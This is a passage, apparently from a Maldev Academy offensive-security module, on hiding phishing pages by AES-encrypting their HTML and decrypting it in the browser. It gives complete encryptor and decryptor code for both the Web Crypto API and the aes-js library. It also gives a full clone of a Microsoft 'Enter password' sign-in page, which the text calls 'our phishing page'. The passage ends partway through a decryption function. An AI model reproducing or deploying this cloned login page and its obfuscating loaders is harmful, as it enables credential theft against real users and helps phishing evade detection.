Y3k9IjYuNTYzNCIgcj0iNC4yMzQyIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIC45NzU0MyAtLjQ1NTMxIDEuNDAzOCkiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgPHN0b3Agc3RvcC1jb2xvcj0iI2Q1ZjFkNSIgb2Zmc2V0PSIwIi8+CiAgIDxzdG9wIHN0b3AtY29sb3I9IiNkNWYxZDUiIHN0b3Atb3BhY2l0eT0iMCIgb2Zmc2V0PSIxIi8+CiAgPC9yYWRpYWxHcmFkaWVudD4KICA8cmFkaWFsR3JhZGllbnQgaWQ9InJhZGlhbEdyYWRpZW50MTAyNy0xIiBjeD0iMi44Mjc5IiBjeT0iMi43MzAxIiByPSIzLjQ5OTEiIGdyYWRpZW50VHJhbnNmb3JtPSJtYXRyaXgoMS4yMTAxIDAgMCAxLjE4MDQgNC4zODgyIDQuNDg1KSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiPgogICA8c3RvcCBzdG9wLWNvbG9yPSIjZmZiZWJlIiBvZmZzZXQ9IjAiLz4KICAgPHN0b3Agc3RvcC1jb2xvcj0iI2ZmYmViZSIgc3RvcC1vcGFjaXR5PSIwIiBvZmZzZXQ9IjEiLz4KICA8L3JhZGlhbEdyYWRpZW50PgogIDxyYWRpYWxHcmFkaWVudCBpZD0icmFkaWFsR3JhZGllbnQxMTMxIiBjeD0iMi4wOTc2IiBjeT0iMi4wMDc5IiByPSI0LjIzNDIiIGdyYWRpZW50VHJhbnNmb3JtPSJtYXRyaXgoMSAwIDAgLjk3NTQzIC44MzI2NiAuNzkwOTQpIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CiAgIDxzdG9wIHN0b3AtY29sb3I9IiNmZmYyY2MiIG9mZnNldD0iMCIvPgogICA8c3RvcCBzdG9wLWNvbG9yPSIjZmZmMmNjIiBzdG9wLW9wYWNpdHk9IjAiIG9mZnNldD0iMSIvPgogIDwvcmFkaWFsR3JhZGllbnQ+CiA8L2RlZnM+CiA8bWV0YWRhdGE+CiAgPHJkZjpSREY+CiAgIDxjYzpXb3JrIHJkZjphYm91dD0iIj4KICAgIDxkYzpmb3JtYXQ+aW1hZ2Uvc3ZnK3htbDwvZGM6Zm9ybWF0PgogICAgPGRjOnR5cGUgcmRmOnJlc291cmNlPSJodHRwOi8vcHVybC5vcmcvZGMvZGNtaXR5cGUvU3RpbGxJbWFnZSIvPgogICAgPGRjOnRpdGxlLz4KICAgPC9jYzpXb3JrPgogIDwvcmRmOlJERj4KIDwvbWV0YWRhdGE+CiA8Zz4KICA8ZWxsaXBzZSB0cmFuc2Zvcm09InJvdGF0ZSguMTM5MDkpIiBjeD0iMi45MzAzIiBjeT0iMi43NDk1IiByeD0iNC4yMzQyIiByeT0iNC4xMzAyIiBmaWxsPSJ1cmwoI3JhZGlhbEdyYWRpZW50MTEzMSkiIHN0eWxlPSJtaXgtYmxlbmQtbW9kZTpvdmVybGF5Ii8+CiAgPGVsbGlwc2UgdHJhbnNmb3JtPSJyb3RhdGUoLjEzOTA5KSIgY3g9IjcuNDc5MiIgY3k9IjIuMzYxMiIgcng9IjQuMjM0MiIgcnk9IjQuMTMwMiIgZmlsbD0idXJsKCNyYWRpYWxHcmFkaWVudDEwNTkpIiBzdHlsZT0ibWl4LWJsZW5kLW1vZGU6b3ZlcmxheSIvPgogIDxlbGxpcHNlIHRyYW5zZm9ybT0icm90YXRlKC4xMzkwOSkiIGN4PSIyLjEzNTUiIGN5PSI3LjgwNiIgcng9IjQuMjM0MiIgcnk9IjQuMTMwMiIgZmlsbD0idXJsKCNyYWRpYWxHcmFkaWVudDEwOTkpIiBzdHlsZT0ibWl4LWJsZW5kLW1vZGU6bm9ybWFsIi8+CiAgPGVsbGlwc2UgdHJhbnNmb3JtPSJyb3RhdGUoLjEzOTA5KSIgY3g9IjcuODEwMiIgY3k9IjcuNzA3NSIgcng9IjQuMjM0MiIgcnk9IjQuMTMwMiIgZmlsbD0idXJsKCNyYWRpYWxHcmFkaWVudDEwMjctMSkiIHN0eWxlPSJtaXgtYmxlbmQtbW9kZTpub3JtYWwiLz4KIDwvZz4KPC9zdmc+Cg==)  no-repeat fixed center; 
    background-size: cover;
    margin: 0;
}
a {
    color: #0067b8;
    text-decoration: none;
    font-size: .8125rem;
}
.overlay {
    background-color: #101010;
    opacity: .1;
    position: fixed;
    top: 0;
    left: 0;
    height: 100vh;
    width: 100vw;
    z-index: 0;
}
.footer {
    background-color: rgba(20,20,20, 0.6);
    position: fixed;
    bottom: 0;
    height: 28px;
    width: 100vw;
    z-index: 0;
}
.footertext {
    position: fixed;
    right: 0;
    text-align: right;
    color: #fff;
    font-size: 12px;
    line-height: 28px;
    white-space: nowrap;
    display: inline-block;
    margin-left: 8px;
    margin-right: 50px;
}
.outer {
    display: table;
    position: absolute;
    height: 100%;
    width: 100%;
    z-index: 10;
}
.middle {
    display: table-cell;
    vertical-align: middle;
}
.sign-in-box {
    margin-left: auto;
    margin-right: auto;
    position: relative;
    max-width: 400px;
    width: calc(100% - 40px);
    padding: 44px;
    margin-bottom: 28px;
    background-color: #fff;
    -webkit-box-shadow: 0 2px 6px rgba(0,0,0,.2);
    -moz-box-shadow: 0 2px 6px rgba(0,0,0,.2);
    box-shadow: 0 2px 6px rgba(0,0,0,.2);
    min-width: 300px;
    min-height: 300px;
    overflow: hidden;
}

.win-scroll {
    box-sizing: border-box;
}
.logo {
    margin-bottom: 10px;
    box-sizing: border-box;
}
.logo_image {
    height: 40px;
}
.display_name {
    line-height: 24px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    margin-bottom: 15px;
}
.prompt {
    color: #1b1b1b;
    font-size: 1.5rem;
    font-weight: 600;
    padding: 0;
    margin-top: 16px;
    margin-bottom: 15px;
}
#error {
    color: red;
    display: none;
}
.passwordinput {
    padding: 4px 8px;
    border-style: solid;
    border-width: 2px;
    border-color: rgba(0,0,0,.4);
    background-color: rgba(255,255,255,.4);
    height: 32px;
    height: 2rem;
    padding: 6px 10px;
    padding-left: 10px;
    border-width: 1px;
    border-top-width: 1px;
    border-right-width: 1px;
    border-left-width: 1px;
    border-color: #666;
    border-color: rgba(0,0,0,.6);
    height: 36px;
    outline: none;
    border-radius: 0;
    -webkit-border-radius: 0;
    background-color: transparent;
    border-top-width: 0;
    border-left-width: 0;
    border-right-width: 0;
    padding-left: 0;
    display: block;
    width: 90%;
    margin-bottom: 15px;
}
.buttoncontainer {
    position: absolute;
    bottom: 72px;
    right: 50px;
    text-align: right;
    width: 100%;
}
.button {
    color: #fff;
    border-color: #0067b8;
    background-color: #0067b8;
    display: block;
    width: 120px;
    position: absolute;
    right: 0px;
    padding: 5px 14px 6px 14px;
}
.button:hover {
    border-color: #0055a6;
    background-color: #0055a6;
}
</style>
</head>`;

aesEncrypt(textToEncrypt);

// Helper function
// Converts a given ArrayBuffer to a Hexadecimal string
function bufferToHex(buffer) {
    const byteArray = new Uint8Array(buffer);
    return Array.from(byteArray, byte => byte.toString(16).padStart(2, '0')).join('');
}

async function aesEncrypt(plaintext) {
    // IV & key generation
    let iv = window.crypto.getRandomValues(new Uint8Array(16));
    let key = await window.crypto.subtle.generateKey(
        {
            name: "AES-CBC",
            length: 256,
        },
        true,
        ["encrypt"] // Only encrypt is required
    );

    // Encoding plaintext 
    let encoder = new TextEncoder();
    let encodedData = encoder.encode(plaintext);

    // Encrypting
    let encryptedData = await window.crypto.subtle.encrypt(
        {
            name: "AES-CBC",
            iv: iv,
        },
        key,
        encodedData
    );

    // Export the raw key
    const rawKey = await window.crypto.subtle.exportKey("raw", key);

    // Hex encode the key, IV and encrypted content
    const keyHex = bufferToHex(rawKey);
    const ivHex = bufferToHex(iv);
    const encryptedHex = bufferToHex(encryptedData);

    // Print results to console
    console.log("Key:", keyHex);
    console.log("IV:", ivHex);
    console.log("Encrypted Data:", encryptedHex);

    // Print results to document
    document.body.innerHTML += "<p><strong>Key:</strong> " + keyHex + "</p>";
    document.body.innerHTML += "<p><strong>IV:</strong> " + ivHex + "</p>";
    document.body.innerHTML += "<p><strong>Encrypted Data:</strong> " + encryptedHex + "</p>";

}
</script>
</body>
</html>

```
Running our encryptor produces the hex-encoded key, IV and encrypted text.

### Decryptor Phishing Page
The decryption process is managed by the `aesDecrypt` function. The function first converts the hex-encoded key, IV, and encrypted content back to their original formats via the helper function `hexToBuffer`. Then, it imports the raw key, decrypts the encrypted data, and decodes the decrypted content, and lastly it uses `document.write` to display the decrypted phishing page. Keep in mind that the `key`, `iv`, and `enc` values need to be replaced with the values provided by `aesEncrypt`.

```
<!DOCTYPE html>
<html>
<script>
// Replace the values below with the values produced by the aesEncrypt function
const key = "6cece9da673f6c3c4d1d9af8d6137d9edc78adf9e9dc6893474af893d618b97b";
const iv = "856e31f01ec503a9cc87439c14ed8592";
const enc = `1c03de65ac6e01eebe9dd54ad798768db4720ac0b48197d7e39b4fb4e24a4c....`;

function hexToBuffer(hexString) {
    const result = new Uint8Array(hexString.length / 2);
    for (let i = 0; i < hexString.length; i += 2) {
        result[i / 2] = parseInt(hexString.substring(i, i + 2), 16);
    }

    return result.buffer;
}

async function aesDecrypt(keyHex, ivHex, encryptedHex) {

    // Convert hex-encoded to binary
    const encryptedData = hexToBuffer(encryptedHex);
    const iv = hexToBuffer(ivHex);
    const rawKey = hexToBuffer(keyHex);

    // Import the key from raw format
    const key = await window.crypto.subtle.importKey(
        'raw',
        rawKey,
        { name: 'AES-CBC', length: 256 },
        false,
        ['decrypt']
    );

    // Decrypt
    const decryptedData = await window.crypto.subtle.decrypt(
        {
            name: 'AES-CBC',
            iv: iv
        },
        key,
        encryptedData
    );

    // Convert decrypted data back to a text string
    const decoder = new TextDecoder();
    const decryptedText = decoder.decode(decryptedData);

    return decryptedText;
}

aesDecrypt(key, iv, enc).then(decryptedText => {
  document.write(decryptedText); 
})
</script>
</html>

```

### Web Crypto API - Results

- When we load the page, it loads normally as expected. Using Dev Tools we can see that `document.write` ran successfully since it overwritten all the previous content.

- Viewing the page source reveals that the content is encrypted.

## AES-JS Library
Another way to AES encrypt our frontend content is by using the aes-js library. To work with the library, it needs to be included in your web page, which can be done by either using a Content Delivery Network (CDN) or by hosting a local version of the library. The example below uses the minimized version of the library that is hosted on Cloudflare:

```
<script src="https://cdnjs.cloudflare.com/ajax/libs/aes-js/3.1.2/index.min.js"></script>

```
You can also download and host the file on your server, which would require you to reference it as shown below:

```
<script src="/path/to/aes-js/aesjs.js"><script>

```
We've included the `aesjs.js` file in the module's ZIP for convenience. The upcoming sections of this module explain how to encrypt and decrypt using the library and at the end, a demonstration is provided.

### Encoding Plaintext
Before starting the encryption process, we must convert our plaintext into bytes which can be easily accomplished with the `aesjs.utils.utf8.toBytes` function.

```
var plaintext = 'Maldev Academy';
var plaintextBytes = aesjs.utils.utf8.toBytes(plaintext); // Plaintext to bytes

```
Depending on the selected AES mode, we may need to pad the text to be multiples of 16 bytes. For example, `AES-CTR` does not require padding, however `AES-CBC` does require padding. Therefore, the line of code below is optional depending on the selected mode.

```
var paddedPlaintextBytes = aesjs.padding.pkcs7.pad(plaintextBytes) // Pad to multiples of 16 bytes

```

### Criptografia Key & IV
Next, the key and IV must be created and also set into specific formats prior to their usage. We'll demonstrate two methods of formatting the key and IV. The first method involves us creating an array of bytes which and then converting them to the `Uint8Array` format, where each element of the array is an 8-bit unsigned integer.

```
// Method 1 - Array of bytes
var iv = [21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36];

var key_128 = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15];
var key_192 = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23];
var key_256 = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31];

var iv_array = new Uint8Array(iv);
var key_128_array = new Uint8Array(key_128);
var key_192_array = new Uint8Array(key_192);
var key_256_array = new Uint8Array(key_256);

```
The second method converts a hexadecimal string to bytes using the `aesjs.utils.hex.toBytes` function.

```
// Method 2 - Hex to bytes
var iv2 = aesjs.utils.hex.toBytes('a1b2c3d4e5f60718293a4b5c6d7e8f90');

var key_128_2 = aesjs.utils.hex.toBytes('1a2b3c4d5e6f7081920a1b2c3d4e5f6a');
var key_192_2 = aesjs.utils.hex.toBytes('9f8e7d6c5b4a39281726354433221100ffeeddccbbaa');
var key_256_2 = aesjs.utils.hex.toBytes('abcdef1234567890fedcba0987654321abcdefabcdef1234567890fedcba0987');

```

### Criptografia
After generating the key and IV, we must set the AES encryption mode and provide the key and IV. For this example, we'll set the mode to `AES-CBC`. After selecting the mode we'll encrypt the padded plaintext.

```
var aesCbc = new aesjs.ModeOfOperation.cbc(key, iv); // Set encryption mode to AES-CBC
var encryptedBytes = aesCbc.encrypt(paddedPlaintextBytes); // Encrypt the *PADDED* plaintext

```
The final step is to hex-encode the key, IV, and encrypted text as they'll need to be copied to our decryption program.

```
// Convert to hex for displaying purposes
var keyHex = aesjs.utils.hex.fromBytes(key);
var ivHex = aesjs.utils.hex.fromBytes(iv)
var encryptedHex = aesjs.utils.hex.fromBytes(encryptedBytes);

```

### Descriptografia
As usual, the decryption process will need to undo the encryption process's actions. This involves setting the AES mode and providing the key and IV used during encryption, decrypting the data, optionally removing any padding applied during encryption, and finally converting the decrypted bytes back into a readable string.

```
var aesCbcDecrypt = new aesjs.ModeOfOperation.cbc(key, iv); // Set decryption mode to AES-CBC

var decryptedBytes = aesCbcDecrypt.decrypt(encryptedBytes); // Decrypt

var unpaddedPlaintext = aesjs.padding.pkcs7.strip(decryptedBytes); // Remove padding

// Remove padding and convert back to UTF-8 string
var decryptedText = aesjs.utils.utf8.fromBytes();

```

### Complete Code
The encryption function is `aesJsEncrypt` which takes the plaintext to be encrypted then performs the aforementioned steps and outputs the key, IV, and encrypted text. The decryption function, `aesJsDecrypt`, takes the hexadecimal key, IV, and encrypted text, decrypts it, and then uses `document.write` to write the decrypted content.

```
function aesJsEncrypt(plaintext) {

    // Convert plaintext to bytes & pad
    var plaintextBytes = aesjs.utils.utf8.toBytes(plaintext);
    var paddedPlaintextBytes = aesjs.padding.pkcs7.pad(plaintextBytes);

    // IV and key
    var iv = [21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36];
    var key = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31];

    // Format IV and key correctly
    var iv_array = new Uint8Array(iv);
    var key_array = new Uint8Array(key);

    // Select AES-CBC & encrypt
    var aesCbc = new aesjs.ModeOfOperation.cbc(key, iv); // Set encryption mode to AES-CBC
    var encryptedBytes = aesCbc.encrypt(paddedPlaintextBytes); // Encrypt the *PADDED* plaintext

    // Convert to hex
    var keyHex = aesjs.utils.hex.fromBytes(key);
    var ivHex = aesjs.utils.hex.fromBytes(iv)
    var encryptedHex = aesjs.utils.hex.fromBytes(encryptedBytes);

    // Print results to console (optional)
    console.log("Key:", keyHex);
    console.log("IV:", ivHex);
    console.log("Encrypted Data:", encryptedHex);

    // Print results to document
    document.body.innerHTML += "<p><strong>Key:</strong> " + keyHex + "</p>";
    document.body.innerHTML += "<p><strong>IV:</strong> " + ivHex + "</p>";
    document.body.innerHTML += "<p><strong>Encrypted Data:</strong> " + encryptedHex + "</p>";
}

```

```
function aesJsDecrypt(keyHex, ivHex, encryptedHex) {

    // Revert the hex to bytes
    var keyBytes = aesjs.utils.hex.toBytes(keyHex);
    var ivBytes = aesjs.utils.hex.toBytes(ivHex);
    var encryptedBytes = aesjs.utils.hex.toBytes(encryptedHex);

    // Set encryption mode to AES-CBC & decrypt
    var aesCbc = new aesjs.ModeOfOperation.cbc(keyBytes, ivBytes);
    var decryptedBytes = aesCbc.decrypt(encryptedBytes);

    // Remove padding & convert back to bytes
    var unpaddedDecryptedBytes = aesjs.padding.pkcs7.strip(decryptedBytes);
    var decryptedText = aesjs.utils.utf8.fromBytes(unpaddedDecryptedBytes);

    // Write decrypted content to the document
    document.write(decryptedText);
}

```

### AES-JS - Demo
The code below is our encryptor file, `AES-JS-Encryptor.html` which will encrypt the Microsoft login page and print out the key, IV, and hex. Modify the key and IV as needed.

```
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Maldev Academy - AES Encryptor</title>
    <!-- Using aes-js on Cloudflare CDN-->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/aes-js/3.1.2/index.min.js"></script>
</head>
<body>
<script type="text/javascript">

var textToEncrypt = `<body>
    <div id="overlay" class="overlay"></div>
    <div class="footer"><div class="footertext">Terms of use<span style="margin-left: 20px;"></span>Privacy & Cookies</div></div>
    <div class="outer">
        <div class="middle">
            <div class="sign-in-box">
                <div class="win-scroll">
                    <div class="logo">
                        <img width="200px" src="https://cdn.pixabay.com/photo/2013/02/12/09/07/microsoft-80658_1280.png" />
                    </div>
                    <div id="display_name" class="display_name">
                        username@domain.com
                    </div>
                    <div class="prompt">
                        Enter password
                    </div>
                    <div id="error">
                        Please enter the password for your Microsoft account.
                    </div>
                    <input class="passwordinput" id="password" name="passwd" type="password" autocomplete="off" placeholder="Password" >
                </div>
                <p><span style="font-size: .8125rem;">Having trouble?</span> <a href="https://account.live.com/ResetPassword.aspx">Sign in another way</a></p>
                <p><a href="https://account.live.com/ResetPassword.aspx">More information</a></p>
                <div class="buttoncontainer">
                <input type="submit" id="submit" class="button" value="Verify" >
                </div>
            </div>
        </div>
    </div>
</body>
<head>
<title>Sign in to your account</title>
<style>
body {
    font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
    font-size: 15px;
    line-height: 20px;
    font-weight: 400;
    font-size: .9375rem;
    line-height: 1.25rem;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMTBtbSIgaGVpZ2h0PSIxMG1tIiB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9IjAgMCAxMCAxMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczpjYz0iaHR0cDovL2NyZWF0aXZlY29tbW9ucy5vcmcvbnMjIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPgogPGRlZnM+CiAgPHJhZGlhbEdyYWRpZW50IGlkPSJyYWRpYWxHcmFkaWVudDEwNTkiIGN4PSI3LjU5NDYiIGN5PSIyLjE2NSIgcj0iNC4yMzQyIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIC45NzU0MyAtLjExNTM2IC4yNDk0NCkiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgPHN0b3Agc3RvcC1jb2xvcj0iI2Q1ZTJmZiIgb2Zmc2V0PSIwIi8+CiAgIDxzdG9wIHN0b3AtY29sb3I9IiNkNWUyZmYiIHN0b3Atb3BhY2l0eT0iMCIgb2Zmc2V0PSIxIi8+CiAgPC9yYWRpYWxHcmFkaWVudD4KICA8cmFkaWFsR3JhZGllbnQgaWQ9InJhZGlhbEdyYWRpZW50MTA5OSIgY3g9IjIuNTkwOCIgY3k9IjYuNTYzNCIgcj0iNC4yMzQyIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIC45NzU0MyAtLjQ1NTMxIDEuNDAzOCkiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgPHN0b3Agc3RvcC1jb2xvcj0iI2Q1ZjFkNSIgb2Zmc2V0PSIwIi8+CiAgIDxzdG9wIHN0b3AtY29sb3I9IiNkNWYxZDUiIHN0b3Atb3BhY2l0eT0iMCIgb2Zmc2V0PSIxIi8+CiAgPC9yYWRpYWxHcmFkaWVudD4KICA8cmFkaWFsR3JhZGllbnQgaWQ9InJhZGlhbEdyYWRpZW50MTAyNy0xIiBjeD0iMi44Mjc5IiBjeT0iMi43MzAxIiByPSIzLjQ5OTEiIGdyYWRpZW50VHJhbnNmb3JtPSJtYXRyaXgoMS4yMTAxIDAgMCAxLjE4MDQgNC4zODgyIDQuNDg1KSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiPgogICA8c3RvcCBzdG9wLWNvbG9yPSIjZmZiZWJlIiBvZmZzZXQ9IjAiLz4KICAgPHN0b3Agc3RvcC1jb2xvcj0iI2ZmYmViZSIgc3RvcC1vcGFjaXR5PSIwIiBvZmZzZXQ9IjEiLz4KICA8L3JhZGlhbEdyYWRpZW50PgogIDxyYWRpYWxHcmFkaWVudCBpZD0icmFkaWFsR3JhZGllbnQxMTMxIiBjeD0iMi4wOTc2IiBjeT0iMi4wMDc5IiByPSI0LjIzNDIiIGdyYWRpZW50VHJhbnNmb3JtPSJtYXRyaXgoMSAwIDAgLjk3NTQzIC44MzI2NiAuNzkwOTQpIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CiAgIDxzdG9wIHN0b3AtY29sb3I9IiNmZmYyY2MiIG9mZnNldD0iMCIvPgogICA8c3RvcCBzdG9wLWNvbG9yPSIjZmZmMmNjIiBzdG9wLW9wYWNpdHk9IjAiIG9mZnNldD0iMSIvPgogIDwvcmFkaWFsR3JhZGllbnQ+CiA8L2RlZnM+CiA8bWV0YWRhdGE+CiAgPHJkZjpSREY+CiAgIDxjYzpXb3JrIHJkZjphYm91dD0iIj4KICAgIDxkYzpmb3JtYXQ+aW1hZ2Uvc3ZnK3htbDwvZGM6Zm9ybWF0PgogICAgPGRjOnR5cGUgcmRmOnJlc291cmNlPSJodHRwOi8vcHVybC5vcmcvZGMvZGNtaXR5cGUvU3RpbGxJbWFnZSIvPgogICAgPGRjOnRpdGxlLz4KICAgPC9jYzpXb3JrPgogIDwvcmRmOlJERj4KIDwvbWV0YWRhdGE+CiA8Zz4KICA8ZWxsaXBzZSB0cmFuc2Zvcm09InJvdGF0ZSguMTM5MDkpIiBjeD0iMi45MzAzIiBjeT0iMi43NDk1IiByeD0iNC4yMzQyIiByeT0iNC4xMzAyIiBmaWxsPSJ1cmwoI3JhZGlhbEdyYWRpZW50MTEzMSkiIHN0eWxlPSJtaXgtYmxlbmQtbW9kZTpvdmVybGF5Ii8+CiAgPGVsbGlwc2UgdHJhbnNmb3JtPSJyb3RhdGUoLjEzOTA5KSIgY3g9IjcuNDc5MiIgY3k9IjIuMzYxMiIgcng9IjQuMjM0MiIgcnk9IjQuMTMwMiIgZmlsbD0idXJsKCNyYWRpYWxHcmFkaWVudDEwNTkpIiBzdHlsZT0ibWl4LWJsZW5kLW1vZGU6b3ZlcmxheSIvPgogIDxlbGxpcHNlIHRyYW5zZm9ybT0icm90YXRlKC4xMzkwOSkiIGN4PSIyLjEzNTUiIGN5PSI3LjgwNiIgcng9IjQuMjM0MiIgcnk9IjQuMTMwMiIgZmlsbD0idXJsKCNyYWRpYWxHcmFkaWVudDEwOTkpIiBzdHlsZT0ibWl4LWJsZW5kLW1vZGU6bm9ybWFsIi8+CiAgPGVsbGlwc2UgdHJhbnNmb3JtPSJyb3RhdGUoLjEzOTA5KSIgY3g9IjcuODEwMiIgY3k9IjcuNzA3NSIgcng9IjQuMjM0MiIgcnk9IjQuMTMwMiIgZmlsbD0idXJsKCNyYWRpYWxHcmFkaWVudDEwMjctMSkiIHN0eWxlPSJtaXgtYmxlbmQtbW9kZTpub3JtYWwiLz4KIDwvZz4KPC9zdmc+Cg==)  no-repeat fixed center; 
    background-size: cover;
    margin: 0;
}
a {
    color: #0067b8;
    text-decoration: none;
    font-size: .8125rem;
}
.overlay {
    background-color: #101010;
    opacity: .1;
    position: fixed;
    top: 0;
    left: 0;
    height: 100vh;
    width: 100vw;
    z-index: 0;
}
.footer {
    background-color: rgba(20,20,20, 0.6);
    position: fixed;
    bottom: 0;
    height: 28px;
    width: 100vw;
    z-index: 0;
}
.footertext {
    position: fixed;
    right: 0;
    text-align: right;
    color: #fff;
    font-size: 12px;
    line-height: 28px;
    white-space: nowrap;
    display: inline-block;
    margin-left: 8px;
    margin-right: 50px;
}
.outer {
    display: table;
    position: absolute;
    height: 100%;
    width: 100%;
    z-index: 10;
}
.middle {
    display: table-cell;
    vertical-align: middle;
}
.sign-in-box {
    margin-left: auto;
    margin-right: auto;
    position: relative;
    max-width: 400px;
    width: calc(100% - 40px);
    padding: 44px;
    margin-bottom: 28px;
    background-color: #fff;
    -webkit-box-shadow: 0 2px 6px rgba(0,0,0,.2);
    -moz-box-shadow: 0 2px 6px rgba(0,0,0,.2);
    box-shadow: 0 2px 6px rgba(0,0,0,.2);
    min-width: 300px;
    min-height: 300px;
    overflow: hidden;
}

.win-scroll {
    box-sizing: border-box;
}
.logo {
    margin-bottom: 10px;
    box-sizing: border-box;
}
.logo_image {
    height: 40px;
}
.display_name {
    line-height: 24px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    margin-bottom: 15px;
}
.prompt {
    color: #1b1b1b;
    font-size: 1.5rem;
    font-weight: 600;
    padding: 0;
    margin-top: 16px;
    margin-bottom: 15px;
}
#error {
    color: red;
    display: none;
}
.passwordinput {
    padding: 4px 8px;
    border-style: solid;
    border-width: 2px;
    border-color: rgba(0,0,0,.4);
    background-color: rgba(255,255,255,.4);
    height: 32px;
    height: 2rem;
    padding: 6px 10px;
    padding-left: 10px;
    border-width: 1px;
    border-top-width: 1px;
    border-right-width: 1px;
    border-left-width: 1px;
    border-color: #666;
    border-color: rgba(0,0,0,.6);
    height: 36px;
    outline: none;
    border-radius: 0;
    -webkit-border-radius: 0;
    background-color: transparent;
    border-top-width: 0;
    border-left-width: 0;
    border-right-width: 0;
    padding-left: 0;
    display: block;
    width: 90%;
    margin-bottom: 15px;
}
.buttoncontainer {
    position: absolute;
    bottom: 72px;
    right: 50px;
    text-align: right;
    width: 100%;
}
.button {
    color: #fff;
    border-color: #0067b8;
    background-color: #0067b8;
    display: block;
    width: 120px;
    position: absolute;
    right: 0px;
    padding: 5px 14px 6px 14px;
}
.button:hover {
    border-color: #0055a6;
    background-color: #0055a6;
}
</style>
</head>`;

aesJsEncrypt(textToEncrypt);

function aesJsEncrypt(plaintext) {

    // Convert plaintext to bytes & pad
    var plaintextBytes = aesjs.utils.utf8.toBytes(plaintext);
    var paddedPlaintextBytes = aesjs.padding.pkcs7.pad(plaintextBytes);

    // IV and key
    var iv = [21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36];
    var key = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31];

    // Format IV and key correctly
    var iv_array = new Uint8Array(iv);
    var key_array = new Uint8Array(key);

    // Select AES-CBC & encrypt
    var aesCbc = new aesjs.ModeOfOperation.cbc(key, iv); // Set encryption mode to AES-CBC
    var encryptedBytes = aesCbc.encrypt(paddedPlaintextBytes); // Encrypt the *PADDED* plaintext

    // Convert to hex for displaying purposes
    var keyHex = aesjs.utils.hex.fromBytes(key);
    var ivHex = aesjs.utils.hex.fromBytes(iv)
    var encryptedHex = aesjs.utils.hex.fromBytes(encryptedBytes);

    // Print results to console
    console.log("Key:", keyHex);
    console.log("IV:", ivHex);
    console.log("Encrypted Data:", encryptedHex);

    // Print results to document
    document.body.innerHTML += "<p><strong>Key:</strong> " + keyHex + "</p>";
    document.body.innerHTML += "<p><strong>IV:</strong> " + ivHex + "</p>";
    document.body.innerHTML += "<p><strong>Encrypted Data:</strong> " + encryptedHex + "</p>";
}
</script>
</body>
</html>

```
Running our encryptor produces the hex-encoded key, IV, and encrypted text.

Our phishing page, which performs the decryption process, is shown below. Make sure to replace `enc`, `key,` and `iv` with the values provided by the `aesJsEncrypt` function.

```
<!DOCTYPE html>
<html>
<head>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/aes-js/3.1.2/index.min.js"></script>
</head>
<script>
// Replace with the values provided by aesJsEncrypt
const enc = `7817aa9541537b7cd87b6d35...`;
const key = "000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f";
const iv = "15161718191a1b1c1d1e1f2021222324";

function aesJsDecrypt(keyHex, ivHex, encryptedHex) {

    // Revert the hex to bytes
    var keyBytes = aesjs.utils.hex.toBytes(keyHex);
    var ivBytes = aesjs.utils.hex.toBytes(ivHex);
    var encryptedBytes = aesjs.utils.hex.toBytes(encryptedHex);

    // Set encryption mode to AES-CBC & decrypt
